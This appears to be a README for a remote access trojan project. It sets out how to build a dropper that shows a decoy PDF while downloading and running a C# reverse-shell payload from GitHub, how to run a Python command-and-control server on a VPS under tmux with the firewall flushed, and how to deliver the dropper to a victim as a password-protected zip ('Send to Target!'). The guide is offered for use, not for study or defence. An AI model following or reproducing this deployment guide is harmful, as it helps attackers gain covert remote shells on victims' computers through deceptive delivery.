# RAT

Dropper --> Payload --> <- C2


## Setup

### Dropper:
  Need to add 2 links, the first to the pdf that will be loaded at runtime and the other will be to downlaod the Exe and execute. Dropper will be sent on its own to the target so it must be the file zipped with a password.
  - Add link to PDF
  - Add link to EXE
### Payload:
  This payload is in C# so it must be built using dotnet command that keeps it as a standalone binary with no Dll's attached - command for compiling will be shown under these instructions, the shell.cs is the paylaod and will need to have the VPS servers IP and selected port added to the file. The Payload Exe after compiling will be uploaded to a github and downloaded by the dropper. 
  - Add Port + Server IP
  
  1.     dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:IncludeNativeLibrariesForSelfExtract=true

### C2: 
  The C2 must run on a VPS server and needs to run in the background. Open ports for the Reverse shell to access the C2 server.
  -  Add port to C2.py

  #### C2 config Setup:

  Install tmux / git / and the C2.py onto the UBUNTO server 
  1.     sudo apt update && sudo apt install tmux -y
  2.     sudo apt update && sudo apt install git -y
  3.     wget https://raw.githubusercontent.com/username/path/to/file.py

  setup the script to run in the background with tmux
  
  1.     tmux new -s C2test
  2.     python3 C2.py
- Detach from session:
1.     Ctrl + B, then D
- Attach to session:

2.     tmux attach -t C2test
  Usefull tmux commands
  
  1.     tmux kill-session -t C2test
       - Kills tmux sessions
  2.     tmux ls
       - Shows tmux session open


  Get rid of firewall for testing (will update later)
  1.       sudo iptables -F
		   sudo iptables -X
		   sudo iptables -P INPUT ACCEPT
		   sudo iptables -P FORWARD ACCEPT
		   sudo iptables -P OUTPUT ACCEPT

		See Firewall rules:
  2.     sudo iptables -L

## Final

Have the Exe payload and the PDF on a github repo make sure the dropper is connected and the paylaod is configered to connect back to the C2 VPS server correctly. 
1. VPS running
2. Zip Dropper + Password Protected
  - Ctrl + shift + rigth click -> 7zip hover -> add to archive -> create password = zip with password
3. Send to Target!


### Cons 
- no obfuscation
- no loader
- not a certified script = smart screen pop-up
- no persistance

### Requirments
- .NET 9.0 installed
- dotnet added to Path for compiling
- VPS server
- GitHub account to host PDF + EXE 
